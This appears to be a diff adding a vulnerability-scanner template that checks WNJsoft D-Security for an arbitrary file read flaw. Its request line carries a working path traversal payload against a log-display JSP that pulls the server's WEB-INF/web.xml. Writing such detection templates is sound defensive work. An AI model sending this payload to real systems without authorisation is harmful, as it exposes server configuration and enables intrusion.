@@ -1,0 +1,23 @@
+id: wnjsoft-dsecurity-displaylog-fileread
+info:
+  name: WNJsoft D-Security Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</init-param>"
+          - "</url-pattern>"
+          - "</servlet-class>"
+          - "</servlet>"
+          - "</web-app>"
+        part: body
